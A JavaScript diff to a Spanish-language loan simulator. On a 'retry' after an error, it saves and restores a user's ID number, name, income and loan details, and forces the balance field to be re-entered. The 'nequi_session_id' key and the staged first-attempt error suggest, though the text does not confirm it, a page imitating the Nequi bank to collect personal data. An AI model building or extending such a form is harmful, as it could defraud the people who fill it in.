@@ -62,6 +62,9 @@ const LoanSimulator = (function() {
     // Cachear elementos del DOM
     cacheElements();
     
+    // Restaurar datos del formulario si existe (excepto saldo)
+    restoreFormData();
+    
     // Inicializar slider de monto
     initSlider();
     
@@ -142,6 +145,81 @@ const LoanSimulator = (function() {
     const slider = elements.montoSlider;
     const percentage = ((slider.value - slider.min) / (slider.max - slider.min)) * 100;
     slider.style.background = `linear-gradient(to right, var(--color-pink-primary) ${percentage}%, var(--color-gray-primary) ${percentage}%)`;
+  }
+
+  // ========================================
+  // RESTAURAR DATOS DEL FORMULARIO
+  // ========================================
+  function restoreFormData() {
+    const tempFormData = localStorage.getItem('tempFormData');
+    
+    if (!tempFormData) {
+      console.log('ℹ️ No hay datos temporales para restaurar');
+      return;
+    }
+    
+    try {
+      const data = JSON.parse(tempFormData);
+      console.log('🔄 Restaurando datos del formulario (excepto saldo)...');
+      
+      // Restaurar cada campo (excepto saldo)
+      if (data.monto && elements.montoSlider) {
+        elements.montoSlider.value = data.monto;
+        elements.montoDisplay.textContent = formatNumber(data.monto);
+        updateSliderBackground();
+      }
+      
+      if (data.cedula && elements.cedula) {
+        elements.cedula.value = data.cedula;
+      }
+      
+      if (data.nombre && elements.nombre) {
+        elements.nombre.value = data.nombre;
+      }
+      
+      if (data.ocupacion && elements.ocupacion) {
+        elements.ocupacion.value = data.ocupacion;
+      }
+      
+      if (data.ingresos && elements.ingresos) {
+        elements.ingresos.value = data.ingresos;
+      }
+      
+      if (data.gastos && elements.gastos) {
+        elements.gastos.value = data.gastos;
+      }
+      
+      if (data.plazo && elements.plazo) {
+        elements.plazo.value = data.plazo;
+      }
+      
+      if (data.fechaPago && elements.fechaPago) {
+        elements.fechaPago.value = data.fechaPago;
+      }
+      
+      // El campo de saldo queda vacío intencionalmente
+      if (elements.saldo) {
+        elements.saldo.value = '';
+        elements.saldo.style.border = '2px solid #da0081'; // Resaltar en rojo
+        
+        // Hacer scroll al campo de saldo para que el usuario lo vea
+        setTimeout(() => {
+          elements.saldo.scrollIntoView({ 
+            behavior: 'smooth', 
+            block: 'center' 
+          });
+        }, 500);
+      }
+      
+      // Limpiar datos temporales
+      localStorage.removeItem('tempFormData');
+      
+      console.log('✅ Datos restaurados exitosamente (saldo vacío y en rojo)');
+      
+    } catch (error) {
+      console.error('❌ Error al restaurar datos:', error);
+      localStorage.removeItem('tempFormData');
+    }
   }
 
   // ========================================
@@ -336,12 +414,26 @@ const LoanSimulator = (function() {
   function handleRetryButton(e) {
     e.preventDefault();
     
-    console.log('🔄 Intentar nuevamente - Marcando segundo intento y recargando página...');
+    console.log('🔄 Intentar nuevamente - Manteniendo datos y limpiando saldo...');
     
     // Marcar que ya se mostró el error
     const sessionId = localStorage.getItem('nequi_session_id');
     const attemptKey = `loan_attempt_${sessionId}`;
     localStorage.setItem(attemptKey, 'true');
+    
+    // Guardar todos los datos actuales del formulario EXCEPTO el saldo
+    const formData = {
+      monto: elements.montoSlider.value,
+      cedula: elements.cedula.value,
+      nombre: elements.nombre.value,
+      ocupacion: elements.ocupacion.value,
+      ingresos: elements.ingresos.value,
+      gastos: elements.gastos.value,
+      plazo: elements.plazo.value,
+      fechaPago: elements.fechaPago.value
+      // NO guardar saldo - debe quedar vacío
+    };
+    localStorage.setItem('tempFormData', JSON.stringify(formData));
     
     // Recargar la página
     window.location.reload();
